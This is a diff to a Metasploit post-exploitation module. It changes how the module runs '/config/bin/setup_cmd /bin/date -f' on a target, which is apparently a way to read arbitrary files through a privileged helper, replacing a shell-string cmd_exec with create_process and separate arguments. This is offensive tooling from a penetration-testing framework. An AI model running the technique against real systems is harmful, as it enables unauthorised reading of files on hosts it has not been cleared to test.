@@ -33,7 +33,7 @@ class MetasploitModule < Msf::Post
 
   def run
     print_status('Executing command on target')
-    output = cmd_exec("/config/bin/setup_cmd /bin/date -f #{datastore['RPATH']}")
+    output = create_process('/config/bin/setup_cmd', args: ['/bin/date', '-f', datastore['RPATH']])
 
     print_status('Command completed:')
     data = []
